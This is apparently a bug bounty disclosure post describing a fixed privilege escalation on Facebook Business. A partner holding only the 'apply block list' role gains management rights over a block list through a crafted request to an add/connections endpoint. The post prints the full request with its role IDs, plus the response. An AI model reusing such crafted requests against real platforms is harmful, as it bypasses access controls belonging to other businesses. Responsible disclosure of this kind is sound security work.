---
title: Business Partner Can Escalate Role on Block Lists
description: Partner businesses with limited 'apply block list' role could escalate to manage/delete block lists via an insecure add/connections endpoint.
date: 2025-10-3 01:20:00 +0100
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

### 🧾 Description
When a business owner adds a partner to a block list with the "apply block list" role, the partner can abuse the `business/objects/add/connections` endpoint to escalate their permissions and obtain manage rights over the block list. This enables the partner to edit or delete block lists they shouldn't control.

**Impact:** Unauthorized modification or deletion of block lists, undermining access controls and potentially affecting multiple brands/assets that rely on those lists.

---

## ⚙️ Steps to Reproduce

**Actors**  
- **Business_1** — Victim (owns `Block_List_1`)  
- **Business_2** — Partner (granted `apply block list` role)

**Steps**

1. **Business_1** adds **Business_2** to `Block_List_1` with the role **apply block list**.  
2. **Business_2** crafts a request to the `business/objects/add/connections/` endpoint to create a connection with elevated roles:

### 📤 Request
```http
POST /business/objects/add/connections/?business_id={ID_BUSINESS_2}&from_id={ID_BLOCK_LIST_1}&from_asset_type=block-list&to_id={ID_BUSINESS_2}&to_asset_type=brand&roles[0]=2236954236531773&roles[1]=353146195169779 HTTP/1.1
Host: business.facebook.com
Content-Type: application/x-www-form-urlencoded

&__a=1&__dyn=&__req=1p&__be=1&__pc=&dpr=1&__rev=&__comet_req=&fb_dtsg={FB_DTSG}&jazoest={JAZOEST}&__spin_r=&__spin_b=&__spin_t=
```

### ✅ Response
```
for (;;);{"__ar":1,"payload":{"success":true},"dtsgToken":"","bootloadable":{},"ixData":{},"bxData":{},"gkxData":{},"qexData":{},"lid":""}
```

3. After the successful response, **Business_2** can now edit or delete `Block_List_1`effectively escalating from apply-only rights to management rights.

**Result:** Partner with limited, intended-scope access can elevate privileges and control the block list resource.

---

### 🧱 Expected Behavior
Only the resource owner (or explicitly authorized admins) should be able to grant manager roles or create connections that elevate permissions. Partners with the **apply** role must not be able to request or create connections that include management roles without owner approval.

---

## Timeline

- **Reported:** April 30, 2019 
- **Triaged:** May 10, 2019 
- **Fixed:** June 19, 2019  
- **Reward:** June 19, 2019

---
